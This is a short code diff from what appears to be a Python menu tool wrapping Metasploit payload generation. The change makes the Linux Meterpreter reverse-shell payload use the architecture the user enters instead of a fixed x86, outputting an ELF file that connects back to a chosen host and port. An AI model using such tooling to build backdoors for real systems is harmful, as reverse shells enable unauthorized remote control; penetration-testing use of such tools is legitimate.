@@ -256,13 +256,13 @@ def linuxpayloadmenu():
     inputy2 = inputc(f"Enter file to save payload as. Leave empty for default {colorama.Fore.LIGHTRED_EX}({linuxoutfile}){colorama.Fore.BLUE}: ")
     asktb()
     #ASKARCH
-    arch = inputc(f"Enter payload arch (x86/x64). Leave empty for default {colorama.Fore.LIGHTRED_EX}({defaultarch}){colorama.Fore.BLUE}: ")
+    arch = inputc(f"Enter payload arch (x86/x64). Leave empty for default {colorama.Fore.LIGHTRED_EX}({defaultarch}){colorama.Fore.BLUE}: ").strip()
     if inputy2.strip() != "":
         linuxoutfile = inputy2
 
     if inputy == "1": 
         print(colorama.Fore.LIGHTCYAN_EX + "Generating payload...")
-        payloadgen2(f"linux/x86/meterpreter/reverse_{talkbackm1}", lhost, lport, linuxoutfile, '', '-f elf')
+        payloadgen2(f"linux/{arch}/meterpreter/reverse_{talkbackm1}", lhost, lport, linuxoutfile, '', '-f elf')
     else:
         print(colorama.Fore.LIGHTRED_EX + f"ERR: Option {inputy} is not valid" + colorama.Style.RESET_ALL) 
         time.sleep(2)
